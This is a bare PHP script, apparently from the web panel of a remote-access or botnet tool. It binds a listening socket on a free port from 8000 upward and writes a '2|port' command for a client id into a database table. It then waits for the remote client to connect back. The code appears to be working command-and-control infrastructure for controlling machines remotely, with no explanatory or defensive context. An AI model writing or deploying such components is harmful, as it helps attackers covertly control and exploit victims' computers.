<?php
session_start();
if(!isset($_SESSION['logged'])){header("Location:../login.php");exit();}
session_write_close();
include"../db.php";
http_response_code(500);
if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
    exit();
}
if(socket_set_option($sock, SOL_SOCKET, SO_RCVTIMEO, array('sec' => 10, 'usec' => 0))==false ){exit();}
$port = 8000;
$binded=0;
$portbnd=0;
if(!isset($_GET['id'])){exit();}
$id=mysqli_real_escape_string($con,$_GET["id"]);

for($i=$port;$i<9999;$i+=1){
	
	if (socket_bind($sock, "0.0.0.0", $i) === false) {}

	else {$binded=1;$portbnd=$i;break;}

}

if($binded==0){exit();}




$command="2|$portbnd";
if(@mysqli_query($con,"INSERT INTO commands VALUES ('$id','$command')")==FALSE){exit();}






if (socket_listen($sock, 1) === false) {
    socket_close($sock);exit();
}




socket_set_nonblock($sock);

$client=0;

for($i=0;$i<15;$i++){
$clientsock = socket_accept($sock);

if($clientsock!=false){$client=1;break;}
sleep(1);

}
if($client==0){socket_close($sock);exit();}
if($clientsock==false){socket_close($sock);exit();}
socket_set_block($clientsock);

http_response_code(200);


?>